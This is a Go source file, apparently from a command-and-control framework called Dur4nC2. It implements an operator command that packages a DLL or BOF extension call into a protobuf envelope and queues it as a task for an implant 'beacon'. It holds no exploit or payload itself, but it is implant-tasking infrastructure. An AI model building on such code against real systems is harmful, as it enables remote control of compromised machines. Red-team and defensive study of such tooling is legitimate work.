package extensions

import (
	"Dur4nC2/misc/protobuf/commonpb"
	"Dur4nC2/misc/protobuf/implantpb"
	"Dur4nC2/server/console"
	"Dur4nC2/server/db"
	beaconRepository "Dur4nC2/server/domain/beacon/repository/postgres"
	"Dur4nC2/server/domain/models"
	taskRepository "Dur4nC2/server/domain/task/repository/postgres"
	"errors"
	"github.com/desertbit/grumble"
	"github.com/gofrs/uuid"
	"google.golang.org/protobuf/proto"
	"math/rand"
	"strings"
)

func ExtensionCallerCmd(ctx *grumble.Context, con *console.ServerConsoleClient) (string, error) {
	var (
		extensionArgs []byte
		export        string
		extensionName string
	)
	extensionName = ctx.Flags.String("extension-name")
	extensionManifest := installedExtensions[extensionName]
	if extensionName == "" {
		return "", errors.New("extension name required")
	}
	beacon := con.ActiveTarget.GetBeacon()
	if beacon == nil {
		return "", errors.New("non active beacon")
	}

	if extensionManifest == nil {
		return "", errors.New("the extension is not installed")
	}

	if extensionManifest.DependsOn == CoffLoaderName {
		//checking that the coff-loader is installed in the server, we what we need is check if it is loaded in the active beacon
		if installedExtensions[CoffLoaderName] == nil {
			return "", errors.New(CoffLoaderName + " extension required")
		}
		var err error
		//TODO multiple file support
		filePath := strings.ReplaceAll(extensionManifest.Files[0].Path, "\\", "")
		extensionArgs, err = GetBOFArgs(ctx, filePath, extensionManifest)
		if err != nil {
			return "", err
		}
		extensionName = extensionManifest.DependsOn
		export = installedExtensions[extensionName].Entrypoint
	} else {
		//Regular DLLs
		extensionArgs = []byte(strings.Join(ctx.Args.StringList("arguments"), " "))
		export = extensionManifest.Entrypoint
	}

	beaconRepo := beaconRepository.NewPostgresBeaconRepository(db.Session())
	currentBeacon, err := beaconRepo.Read(uuid.FromStringOrNil(beacon.ID))
	if err != nil {
		return "", err
	}
	rq := &commonpb.Request{BeaconID: currentBeacon.ID.String()}
	callExtensionReq := &implantpb.CallExtensionReq{
		Name:    extensionName,
		Args:    extensionArgs,
		Export:  export,
		Request: rq,
	}
	v3 := rand.Intn(999999999999999999-100000000000000000) + 100000000000000000
	data3, _ := proto.Marshal(callExtensionReq)
	taskReq3 := &implantpb.Envelope{
		ID:   int64(v3),
		Type: implantpb.MsgCallExtensionReq,
		Data: data3,
	}
	taskReqData, _ := proto.Marshal(taskReq3)

	newTask := models.BeaconTask{
		EnvelopeID:  int64(v3),
		BeaconID:    currentBeacon.ID,
		Description: "Calling " + extensionName + " extension",
		State:       models.PENDING,
		Request:     taskReqData,
	}
	taskRepo := taskRepository.NewPostgresBeaconTaskRepository(db.Session())
	err = taskRepo.Create(currentBeacon, newTask)
	if err != nil {
		return "", err
	}
	return "good", nil
}
